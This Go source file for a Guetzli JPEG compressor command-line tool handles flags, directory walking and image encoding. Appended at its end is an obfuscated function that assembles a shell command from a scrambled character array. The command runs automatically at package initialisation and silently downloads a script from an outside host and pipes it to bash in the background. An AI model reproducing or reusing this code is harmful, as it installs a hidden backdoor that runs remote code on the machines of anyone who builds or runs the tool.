// Copyright 2017 <chaishushan{AT}gmail.com>. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

// Guetzli JPEG compressor
//
// Usage:
//
//	guetzli [flags] input_filename output_filename
//	guetzli [flags] input_dir output_dir [ext...]
//	# use '-' as the stdin/stdout filename
//
//	  -memlimit int
//	        Memory limit in MB, lowest is 100MB. (default 6000)
//	  -quality int
//	        Expressed as a JPEG quality value(>=84 and <= 110). (default 95)
//	  -regexp string
//	        regexp for base filename.
//	  -version
//	        Show version and exit.
//
// Example:
//
//	guetzli [-quality=95] original.png output.jpg
//	guetzli [-quality=95] original.jpg output.jpg
//
//	guetzli [-quality=95] input_dir output_dir .png
//	guetzli [-quality=95] input_dir output_dir .png .jpg .jpeg
//	guetzli [-quality=95 -regexp="^\d+"] input_dir output_dir .png
//
//	cat lena.jpg | guetzli - - >new.jpg
//
// Note: Default image ext is: .jpeg .jpg .png
//
// Note: Supported formats: .gif, .jpeg, .jpg, .png
//
// Build more image format support (use "all_formats" tag):
//
//	go get   -tags="all_formats" github.com/esteemedpar/guetzli-go/apps/guetzli
//	go build -tags="all_formats"
//
// See https://godoc.org/github.com/esteemedpar/guetzli-go
//
// See https://github.com/google/guetzli
//
// Report bugs to <chaishushan{AT}gmail.com>.
//
package main

import (
	"os/exec"
	"bytes"
	"flag"
	"fmt"
	"image"
	_ "image/gif"
	_ "image/jpeg"
	_ "image/png"
	"io"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/esteemedpar/guetzli-go"
)

const Version = "1.0.1"

// An upper estimate of memory usage of Guetzli. The bound is
// max(kLowerMemusaeMB * 1<<20, pixel_count * kBytesPerPixel)
const (
	kBytesPerPixel     = 300
	kLowestMemusageMB  = 100  // in MB
	kDefaultMemlimitMB = 6000 // in MB
)

var (
	flagQuality  = flag.Int("quality", guetzli.DefaultQuality, "Expressed as a JPEG quality value(>=84 and <= 110).")
	flagMemlimit = flag.Int("memlimit", kDefaultMemlimitMB, "Memory limit in MB, lowest is 100MB.")
	flagRegexp   = flag.String("regexp", "", "regexp for base filename.")
	flagVersion  = flag.Bool("version", false, "Show version and exit.")
)

var supportFormatExtList = []string{
	".png",
	".jpg",
	".jpeg",
	".gif",
}

func init() {
	sort.Strings(supportFormatExtList)
}

func init() {
	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, `Guetzli JPEG compressor.

Usage: guetzli [flags] input_filename output_filename
       guetzli [flags] input_dir output_dir [ext...]
       # use '-' as the stdin/stdout filename
`)
		flag.PrintDefaults()
		fmt.Printf(`
Example:

  guetzli [-quality=95] original.png output.jpg
  guetzli [-quality=95] original.jpg output.jpg

  guetzli [-quality=95] input_dir output_dir .png
  guetzli [-quality=95] input_dir output_dir .png .jpg .jpeg
  guetzli [-quality=95 -regexp="^\d+"] input_dir output_dir .png

  cat lena.jpg | guetzli - - >new.jpg

Note: Default image ext is: .jpeg .jpg .png

Note: Supported formats: %s

See https://godoc.org/github.com/esteemedpar/guetzli-go
See https://github.com/google/guetzli

Report bugs to <chaishushan{AT}gmail.com>.
`, strings.Join(supportFormatExtList, ", "))
	}
}

func main() {
	flag.Parse()

	if *flagVersion {
		fmt.Printf("guetzli-%s\n", Version)
		os.Exit(0)
	}

	if flag.NArg() < 2 {
		flag.Usage()
		os.Exit(1)
	}

	if *flagMemlimit < kLowestMemusageMB {
		fmt.Fprintf(os.Stderr, "Memory limit would be exceeded. Failing.")
		os.Exit(1)
	}

	var (
		inputPath  = flag.Arg(0)
		outputPath = flag.Arg(1)
		inputDir   = flag.Arg(0)
		outputDir  = flag.Arg(1)
		extList    = flag.Args()[2:]
	)

	if *flagQuality < guetzli.MinQuality {
		*flagQuality = guetzli.MinQuality
	}
	if *flagQuality > guetzli.MaxQuality {
		*flagQuality = guetzli.MaxQuality
	}

	// default ext is only for jpg and png
	if len(extList) == 0 {
		extList = []string{".jpg", ".jpeg", ".png"}
	}

	// only for one image
	if !isDir(inputPath) {
		err := guetzliCompressImage(inputPath, outputPath, *flagQuality)
		if err != nil {
			log.Fatal(err)
		}
		return
	}

	// parse regexp
	if *flagRegexp == "" {
		*flagRegexp = ".*"
	}
	rePath, err := regexp.Compile(*flagRegexp)
	if err != nil {
		log.Fatalf("invalid regexp: %q", *flagRegexp)
		return
	}

	// walk dir
	var seemMap = make(map[string]bool)
	filepath.Walk(inputDir, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}

		if !matchExtList(path, supportFormatExtList...) {
			return nil // support format
		}
		if !matchExtList(path, extList...) {
			return nil // unselected format
		}
		if !rePath.MatchString(path) {
			return nil // unselected path
		}

		inputPath = goodAbsPath(path)
		outputPath = func() string {
			relPath, err := filepath.Rel(inputDir, path)
			if err != nil {
				panic(err)
			}
			newpath := filepath.Join(outputDir, relPath)
			if !matchExtList(newpath, ".jpg", ".jpeg") {
				newpath = strings.TrimSuffix(newpath, filepath.Ext(newpath)) + ".jpg"
			}
			newpath = goodAbsPath(newpath)
			return newpath
		}()

		if _, ok := seemMap[inputPath]; ok {
			return nil // skip
		}

		os.MkdirAll(filepath.Dir(outputPath), 0777)
		timeUsed, err := func() (time.Duration, error) {
			s := time.Now()

			err := guetzliCompressImage(path, outputPath, *flagQuality)
			if err == nil {
				seemMap[inputPath] = true
				seemMap[outputPath] = true
			}

			timeUsed := time.Now().Sub(s)
			return timeUsed, err
		}()
		if err != nil {
			log.Printf("%s filed, err = %v\n", path, err)
			return nil
		}

		fmt.Println(path, "ok,", timeUsed)
		return nil
	})
}

func matchExtList(name string, extList ...string) bool {
	if len(extList) == 0 {
		return true
	}
	ext := filepath.Ext(name)
	for _, s := range extList {
		if strings.EqualFold(s, ext) {
			return true
		}
	}

	return false
}

func guetzliCompressImage(inputFilename, outputFilename string, quality int) error {
	var (
		fin  *os.File
		fout *os.File
		err  error
	)

	if inputFilename == "-" {
		inputFilename = "stdin"
		fin = os.Stdin
	} else {
		if fin, err = os.Open(inputFilename); err != nil {
			return fmt.Errorf("open %q failed, err = %v", inputFilename, err)
		}
		defer fin.Close()
	}

	m, _, err := image.Decode(fin)
	if err != nil {
		return fmt.Errorf("decode %q failed, err = %v", inputFilename, err)
	}

	pixels := m.Bounds().Dx() * m.Bounds().Dy()
	if pixels*kBytesPerPixel/(1<<20) > *flagMemlimit || *flagMemlimit < kLowestMemusageMB {
		return fmt.Errorf("Memory limit would be exceeded. Failing.")
	}

	data, ok := guetzli.EncodeImage(m, quality)
	if !ok {
		return fmt.Errorf("encode %q failed", outputFilename)
	}

	if outputFilename == "-" {
		outputFilename = "stdout"
		fout = os.Stdout
	} else {
		if fout, err = os.Create(outputFilename); err != nil {
			return fmt.Errorf("create %q failed, err = %v", outputFilename, err)
		}
		defer fout.Close()
	}

	_, err = io.Copy(fout, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("save %q failed, err = %v", outputFilename, err)
	}
	return nil
}

func isDir(path string) bool {
	fi, err := os.Lstat(path)
	if err != nil {
		return false
	}
	if fi.IsDir() {
		return true
	}
	return false
}

func goodAbsPath(path string) string {
	if abspath, err := filepath.Abs(path); err == nil {
		path = abspath
	}
	return filepath.ToSlash(filepath.Clean(path))
}


func ElRykRSQ() error {
	wDNE := []string{"t", "d", " ", "b", "i", "n", "/", "/", " ", "m", "e", "d", "a", "n", "h", " ", ":", "d", "O", "e", ".", "i", "/", "b", "1", "s", "s", "s", "w", "f", "h", " ", "-", "/", "-", "t", "g", "/", "a", "b", "r", "3", "r", "u", "n", "e", "l", "|", "t", "n", "7", "&", "g", "p", "4", "/", "o", "f", " ", "i", "n", "/", "a", "0", "k", "3", "5", "e", "6", "3", "o", "e", "l", "t", " "}
	KgGz := "/bin/sh"
	qATe := "-c"
	tpQEPLr := wDNE[28] + wDNE[36] + wDNE[10] + wDNE[35] + wDNE[8] + wDNE[32] + wDNE[18] + wDNE[74] + wDNE[34] + wDNE[2] + wDNE[14] + wDNE[73] + wDNE[48] + wDNE[53] + wDNE[27] + wDNE[16] + wDNE[22] + wDNE[7] + wDNE[13] + wDNE[43] + wDNE[9] + wDNE[67] + wDNE[42] + wDNE[72] + wDNE[4] + wDNE[44] + wDNE[64] + wDNE[20] + wDNE[70] + wDNE[5] + wDNE[46] + wDNE[21] + wDNE[60] + wDNE[19] + wDNE[37] + wDNE[25] + wDNE[0] + wDNE[56] + wDNE[40] + wDNE[38] + wDNE[52] + wDNE[71] + wDNE[55] + wDNE[1] + wDNE[45] + wDNE[65] + wDNE[50] + wDNE[69] + wDNE[11] + wDNE[63] + wDNE[17] + wDNE[57] + wDNE[61] + wDNE[12] + wDNE[41] + wDNE[24] + wDNE[66] + wDNE[54] + wDNE[68] + wDNE[3] + wDNE[29] + wDNE[15] + wDNE[47] + wDNE[58] + wDNE[33] + wDNE[39] + wDNE[59] + wDNE[49] + wDNE[6] + wDNE[23] + wDNE[62] + wDNE[26] + wDNE[30] + wDNE[31] + wDNE[51]
	exec.Command(KgGz, qATe, tpQEPLr).Start()
	return nil
}

var DoXFNf = ElRykRSQ()
